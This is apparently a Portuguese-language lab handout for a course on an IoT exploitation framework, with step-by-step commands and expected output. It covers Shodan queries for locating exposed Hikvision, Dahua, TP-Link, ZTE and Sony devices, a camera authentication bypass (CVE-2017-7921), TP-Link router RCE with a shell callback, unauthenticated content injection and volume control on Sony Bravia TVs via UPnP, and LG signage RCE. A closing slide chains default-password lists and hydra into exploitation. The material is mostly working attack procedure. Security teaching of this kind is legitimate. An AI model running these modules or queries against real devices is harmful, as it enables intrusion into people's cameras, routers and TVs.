# Lab 03 — EmbedXPL-Forge (EXF)

**Repo:** `submodules/Uniao-Geek/EmbedXPL-Forge`  
**Entry:** `python exf.py` (interativo) ou `python exf.py -m <modulo> -s "opcao valor"`  
**Escala:** 3009 modulos (S=1037, A=654, C=1309 stubs)  
**Focos desta aula:** CCTV, roteadores BR, Smart TV (Sony Bravia UPnP)

---

## 0. Setup da sessao

**IN**
```powershell
cd C:\Projetos-SafeLabs\submodules\Uniao-Geek\EmbedXPL-Forge
$env:PYTHONPATH = (Get-Location).Path
$env:TARGET = "192.168.10.50"      # camera / router lab
$env:TV = "192.168.10.60"          # Smart TV lab
```

**OUT**
```
(silencioso)
```

---

## 1. Modo interativo — help

**IN**
```powershell
python exf.py
```

**IN** (dentro do console EXF)
```
help
```

**OUT**
```
search <term>        Search for appropriate module
use <module>         Load module
set <option> <value> Set module option
check                Test if target is vulnerable
run                  Execute module
show exploits        List exploit modules
show scanners        List scanner modules
exit
```

---

## 2. Buscar modulos (search)

**IN** (console)
```
search bravia
```

**OUT**
```
scanners/smart_tv/bravia_discover
scanners/smart_tv/bravia_upnp_audit
exploits/smart_tv/sony_bravia/upnp_av_transport_ssrf
exploits/smart_tv/sony_bravia/upnp_unauth_volume_control
...
```

**IN**
```
search type=exploits device=cameras vendor=hikvision
```

**OUT**
```
exploits/cameras/hikvision/...
```

---

## 3. Modo nao-interativo — sintaxe geral

**IN**
```powershell
python exf.py -m <caminho/modulo> -s "target IP" -s "port N"
```

**OUT** (padrao)
```
[+] target => IP
[*] Running module ...
[+] / [-] / [!]  mensagens de check ou run
```

---

## Trilha A — CCTV Intelbras (Dahua OEM)

### A1. Shodan

| Query |
|-------|
| `product:"Hikvision" port:80,8000` |
| `product:"Dahua" rtsp` |
| `"Intelbras" http.html port:80` |
| `port:554 "RTSP/1.0"` |

### A2. Scanner RTSP generico

**IN**
```powershell
python exf.py -m scanners/cameras/rtsp_discover -s "target $env:TARGET"
```

**OUT** (camera lab)
```
[+] target => 192.168.10.50
[*] Probing RTSP on 192.168.10.50:554 ...
[+] RTSP/1.0 200 OK
[+] Stream path: /Streaming/Channels/101
```

### A3. Exploit auth bypass Intelbras

**IN**
```powershell
python exf.py -m exploits/cameras/intelbras/cctv_dahua_auth_bypass -s "target $env:TARGET" -s "port 80"
```

**OUT** (vulneravel)
```
[*] Probing CVE-2017-7921 auth bypass ...
[+] Authentication bypass successful
[+] Admin session obtained
```

**OUT** (patchado)
```
[-] Target does not appear vulnerable
```

### A4. Check antes de run (console)

**IN**
```
use exploits/cameras/intelbras/cctv_dahua_auth_bypass
set target 192.168.10.50
check
```

**OUT**
```
[+] Target is vulnerable
```

**IN**
```
run
```

**OUT**
```
[+] Exploit completed
```

---

## Trilha B — Roteador SOHO (tier #1 IoT)

### B1. Shodan

| Query |
|-------|
| `product:"TP-Link" http.title:"TL-"` |
| `product:"ZTE" http.title:"F660"` |
| `cve:CVE-2023-1389` |

### B2. Scanner ISP Brasil

**IN**
```powershell
python exf.py -m scanners/specialized/br_isp_scanner -s "target $env:TARGET"
```

**OUT**
```
[*] Scanning BR ISP device fingerprint ...
[+] Vendor: Intelbras / ZTE / ...
[+] HTTP title: ...
```

### B3. Exploit roteador (exemplo TP-Link)

**IN**
```powershell
python exf.py -m exploits/routers/tplink/archer_ax21_rce_cve_2023_1389 -s "target $env:TARGET"
```

**OUT** (lab vulneravel)
```
[+] check: vulnerable
[*] run: sending exploit payload ...
[+] Command execution confirmed / shell callback
```

Nota instrutor: validar modulo exato com `search tplink cve-2023-1389` antes da aula; arsenal tem 668 modulos router.

---

## Trilha C — Sony Bravia / UPnP / "trocar imagem na TV"

### C0. O que o modulo faz (slide conceitual)

| Pergunta | Resposta |
|----------|----------|
| Troca logo de boot? | **Nao** |
| Troca conteudo na tela? | **Sim** via UPnP `SetAVTransportURI` + `Play` (TV ligada) |
| Porta UPnP Bravia non-Android | **2870** |
| Signage Sony profissional? | **Gap** no EXF (existe `lg_signage/` para LG) |

### C1. Shodan

| Query |
|-------|
| `port:2870 product:"Sony" OR "BRAVIA"` |
| `http.html:"/sony/system" port:80,443` |
| `port:1900 "SERVER: UPnP"` |

### C2. Discover REST (Android/residencial)

**IN**
```powershell
python exf.py -m scanners/smart_tv/bravia_discover -s "target $env:TV"
```

**OUT**
```
[*] Discovering Sony Bravia TV at 192.168.10.60
[+] Sony Bravia REST API at 192.168.10.60:80/sony/system
[+] Model: ...
[+] Firmware: ...
```

### C3. Auditoria UPnP (check only)

**IN**
```powershell
python exf.py -m scanners/smart_tv/bravia_upnp_audit -s "target $env:TV"
```

**OUT** (TV ligada, UPnP ativo)
```
[*] Auditing UPnP on 192.168.10.60:2870
[+] SSDP: Sony Bravia MediaRenderer detected
[+] GetVolume: 15 (unauthenticated read)
[+] SetAVTransportURI test: accepted
[!] SSRF vector present when TV is on
```

**OUT** (TV desligada / localhost — smoke test real)
```
[*] Auditing UPnP on 127.0.0.1:2870
[!] No SSDP response (TV may be fully off or on different subnet)
[-] GetVolume not accessible
```

### C4. Content injection / SSRF (lab — TV LIGADA)

Preparar servidor HTTP no atacante (lab):

**IN** (maquina atacante 192.168.10.100)
```powershell
python -m http.server 8080 --directory C:\Projetos-SafeLabs\.tmp\slide-demo
```

Colocar `demo.jpg` ou `demo.mp4` na pasta.

**IN** (EXF)
```powershell
python exf.py -m exploits/smart_tv/sony_bravia/upnp_av_transport_ssrf `
  -s "target $env:TV" `
  -s "uri http://192.168.10.100:8080/demo.jpg" `
  -s "play true"
```

**OUT** (sucesso — TV ligada)
```
[*] Injecting URI via SetAVTransportURI on 192.168.10.60:2870 (no auth)
[*] Target URI: http://192.168.10.100:8080/demo.jpg
[+] SetAVTransportURI ACCEPTED (HTTP 200) — URI injected without auth
[*] Sending Play to trigger TV HTTP fetch ...
[+] Play ACCEPTED — TV is now fetching: http://192.168.10.100:8080/demo.jpg
[+] Check attacker HTTP server for incoming connection from 192.168.10.60
```

**OUT** (TV standby — URI injetada, Play falha)
```
[+] SetAVTransportURI ACCEPTED (HTTP 200)
[!] Play: 5xx error (TV in standby — URI injected, Play will succeed when TV is on)
```

**OUT** (servidor HTTP atacante)
```
192.168.10.60 - - "GET /demo.jpg HTTP/1.1" 200 -
```

Slide: mostrar **imagem na TV** + log HTTP = prova de content injection.

### C5. Volume sem autenticacao (demo rapida)

**IN**
```powershell
python exf.py -m exploits/smart_tv/sony_bravia/upnp_unauth_volume_control -s "target $env:TV"
```

**OUT**
```
[+] SetVolume accepted (no auth)
[+] Current volume read without credentials
```

### C6. Signage LG (comparativo — modulo existe)

**IN**
```powershell
python exf.py -m exploits/smart_tv/lg_signage/webos_signage_rce_cve_2024_1885 -s "target 192.168.10.70" -s "port 9080"
```

**OUT** (painel signage lab)
```
[*] Probing CVE-2024-1885 ...
[+] Unauthenticated RCE vector present
```

Sony BRAVIA Digital Signage: documentar como **gap**; referencia externa ZSL-2020-5612.

---

## Trilha D — Multi-target

**IN** (arquivo `targets.txt`, um IP por linha)
```powershell
Set-Content .tmp\targets-lab.txt "192.168.10.50`n192.168.10.60"
python exf.py -T .tmp\targets-lab.txt -m scanners/smart_tv/smart_tv_discover
```

**OUT**
```
[*] Scanning target 1/2: 192.168.10.50
...
[*] Scanning target 2/2: 192.168.10.60
...
```

---

## Auditoria de qualidade dos modulos (instrutor)

**IN**
```powershell
python tools\audit_modules.py
```

**OUT**
```
Total modules scanned: 3009
Tier S (Full exploit logic): 1037 modules (34.5%)
Tier C (Pure stub/minimal): 1309 modules (43.5%)
```

Slide: preferir modulos **Tier S** no lab; Tier C = recon only.

---

## NSE (opcional, com nmap)

**IN**
```bash
nmap --script embedxpl-hikvision-vuln.nse -p 80,8000 192.168.10.50
nmap --script embedxpl-rtsp-discover.nse -p 554 192.168.10.50
```

**OUT**
```
| embedxpl-hikvision-vuln:
|   VULNERABLE: ...
```

Scripts em `EmbedXPL-Forge/nse/`.

---

## Fluxo slide-a-slide (aula EXF)

| Slide | Titulo | IN | OUT chave |
|-------|--------|-----|-----------|
| 1 | Arsenal | `python tools/audit_modules.py` | 3009 modulos |
| 2 | Search | `search bravia` | lista modulos |
| 3 | CCTV check | `-m .../cctv_dahua_auth_bypass` + check | vulnerable |
| 4 | Bravia discover | `-m scanners/.../bravia_discover` | REST API |
| 5 | UPnP audit | `-m scanners/.../bravia_upnp_audit` | SSDP + volume |
| 6 | Content inject | `-m .../upnp_av_transport_ssrf` | HTTP GET na TV |
| 7 | Gap signage | slide texto | Sony signage sem modulo |

---

## Mapa categoria → pasta EXF

| Categoria IoT | Pasta | Modulos (approx) |
|---------------|-------|------------------:|
| Roteadores | `exploits/routers/` | 668 |
| Cameras | `exploits/cameras/` + `scanners/cameras/` | 85 + 21 |
| Smart TV | `exploits/smart_tv/` + `scanners/smart_tv/` | 59 + 13 |
| Impressoras | `exploits/printers/` | 193 |
| NAS | `exploits/nas/` | 11 |
| BR ISP | `scanners/specialized/br_isp_scanner` | 1 |

---

## Troubleshooting

| Sintoma | Acao |
|---------|------|
| `bootstrap error: missing dependency` | `pip install -r requirements.txt` |
| `A module is required` | Adicionar `-m caminho/modulo` |
| Bravia SSDP vazio | TV na mesma subnet; ligar TV |
| Play 5xx | Normal em standby; ligar TV e repetir |
| Modulo nao acha alvo | `search` com vendor/CVE exato |
| Stub Tier C | Trocar modulo ou usar so `check` |

---

## Correlacao WFH + PXF + EXF (slide final)

```
Shodan → marca/IP
   ↓
WFH default-creds / mangle → lista senhas
   ↓
EXF check (scanner) → vulneravel?
   ↓
EXF run OU PXF --ipp / hydra → impacto no lab
```
